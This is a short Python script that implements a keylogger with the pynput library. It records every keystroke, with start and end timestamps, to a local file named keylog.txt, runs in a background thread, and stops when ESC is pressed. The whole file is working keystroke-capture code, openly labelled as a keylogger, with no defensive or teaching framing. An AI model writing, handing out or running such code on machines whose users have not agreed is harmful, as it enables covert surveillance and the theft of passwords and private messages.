from pynput import keyboard
import time
import threading
import os

def log_key(key):
    try:
        key_data = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        key_data = str(key)
    
    with open("keylog.txt", "a") as log_file:
        log_file.write(f"{key_data} ")

def on_press(key):
    log_key(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener on ESC key

def start_keylogger():
    with open("keylog.txt", "a") as log_file:
        log_file.write(f"\n--- Logging started at {time.ctime()} ---\n")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    with open("keylog.txt", "a") as log_file:
        log_file.write(f"\n--- Logging ended at {time.ctime()} ---\n")

if __name__ == "__main__":
    log_thread = threading.Thread(target=start_keylogger, daemon=True)
    log_thread.start()
    print("Keylogger is running in the background. Press ESC to stop.")
    log_thread.join()
